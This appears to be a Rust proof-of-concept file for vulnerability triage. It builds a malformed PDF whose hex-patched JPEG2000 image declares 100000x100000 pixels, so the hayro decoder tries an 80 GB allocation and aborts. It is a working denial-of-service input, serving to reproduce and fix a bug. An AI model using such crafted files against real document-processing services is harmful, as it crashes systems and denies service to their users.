// Standalone reproduction for candidate 008: hayro-jpeg2000's `DecoderContext::reset`
// (hayro-jpeg2000/src/j2c/decode.rs) eagerly allocates one `SimdBuffer<f32>` per image
// component, each sized `image_width() * image_height()` samples, before decoding a single
// byte of the actual entropy-coded tile data. The only guard on that multiplication is
// `checked_mul` (overflow-only), not a "this is an unreasonable amount of memory to eagerly
// allocate" sanity cap - a pre-existing `MAX_DIMENSIONS = 60000` per-axis cap was deliberately
// removed in commit a7e3aace ("hayro-jpeg2000: Lift hardcoded restriction on image
// dimensions"), and nothing replaced it at the point the buffers are actually allocated.
//
// This drives the real, public, documented entry point a real integrator of `hayro-interpret`
// uses when it wants decoded image data without the top-level `hayro` renderer's own
// (CTM-derived) downscale hint - the exact same pattern as this project's own shipped example,
// `hayro-interpret/examples/extract_images.rs`: a real `Device` implementation, driven by the
// real `hayro_interpret::interpret_page` callback protocol, over a real PDF byte stream parsed
// by the real `hayro_syntax::Pdf`, calling `RasterImage::with_rgba(_, None)`. The malformed PDF
// (with a hex-patched JPEG2000 codestream declaring a 100000x100000, 2-component image) is the
// genuine external/adversarial input; nothing about the trigger path is faked or hand-simulated.
//
// Exit code convention: 0 = did not reproduce (patched - bug absent, decode failed gracefully),
// abort/non-zero = reproduced.

use hayro_interpret::font::GlyphRun;
use hayro_interpret::{
    BlendMode, ClipPath, Context, Device, DrawMode, DrawProps, Image, ImageData, ImageDrawProps,
    InterpreterCache, InterpreterSettings, SoftMask, interpret_page,
};
use hayro_syntax::Pdf;
use kurbo::{Affine, BezPath, Rect};

// A minimal, legitimately-parseable JPEG2000 codestream (derived from this project's own test
// fixture `hayro-tests/pdfs/load/different_resolution_levels.jp2`), hex-patched so its SIZ
// marker declares `Xsiz = Ysiz = XTsiz = YTsiz = 100000` (0x000186A0) and
// `XOsiz = YOsiz = XTOsiz = YTOsiz = 0` (single tile spanning the whole, now-huge, image; all of
// `size_marker`'s own tile/offset validation constraints are still satisfied). Two components
// (unchanged from the source fixture) means the actual eager allocation this triggers is
// `100000 * 100000 * 4 bytes/f32 * 2 components = 80,000,000,000 bytes` (80 GB).
const JP2C: &[u8] = include_bytes!("patched.j2c");

fn build_poc_pdf() -> Vec<u8> {
    let mut img_dict = format!(
        "<< /Type /XObject /Subtype /Image /Width 100000 /Height 100000 \
/BitsPerComponent 8 /ColorSpace /DeviceGray /Filter /JPXDecode /Length {} >>",
        JP2C.len()
    )
    .into_bytes();
    let mut obj4 = Vec::new();
    obj4.append(&mut img_dict);
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(JP2C);
    obj4.extend_from_slice(b"\nendstream");

    let content: &[u8] = b"q 100 0 0 100 50 50 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

struct Extractor;

impl Device<'_> for Extractor {
    fn draw_path(&mut self, _: &BezPath, _: DrawProps<'_>, _: &DrawMode) {}
    fn push_clip_path(&mut self, _: &ClipPath) {}
    fn push_transparency_group(&mut self, _: f32, _: Option<SoftMask<'_>>, _: BlendMode) {}
    fn draw_glyph_run(&mut self, _: &GlyphRun<'_, '_>, _: DrawProps<'_>, _: &DrawMode) {}
    fn pop_clip(&mut self) {}
    fn pop_transparency_group(&mut self) {}

    fn draw_image(&mut self, image: Image<'_, '_>, _: ImageDrawProps<'_>) {
        if let Image::Raster(r) = image {
            // `None` = no downscale hint, exactly like `extract_images.rs`'s own real usage.
            r.with_rgba(
                |image, _alpha| {
                    let (w, h) = match &image {
                        ImageData::Rgb(rgb) => (rgb.width, rgb.height),
                        ImageData::Luma(luma) => (luma.width, luma.height),
                    };
                    println!("decoded image callback fired: {w}x{h} (bug not reproduced - decode succeeded)");
                },
                None,
            );
        }
    }
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!(
        "built PoC PDF: {} bytes (embedded JPEG2000 codestream: {} bytes, declares 100000x100000, 2 components)",
        pdf_bytes.len(),
        JP2C.len()
    );

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = &pdf.pages()[0];

    let mut extractor = Extractor;
    let settings = InterpreterSettings::default();
    let cache = InterpreterCache::new();
    let mut context = Context::new(
        Affine::IDENTITY,
        Rect::new(0.0, 0.0, 1.0, 1.0),
        &cache,
        pdf.xref(),
        settings,
    );

    println!(
        "interpreting page (real /JPXDecode filter, real interpret_page + Device, no \
target-dimension hint - if there is no total-sample-count cap before eager allocation, this is \
where an 80 GB allocation is attempted)..."
    );

    interpret_page(page, &mut context, &mut extractor);

    println!("did not reproduce - page interpreted without aborting");
}
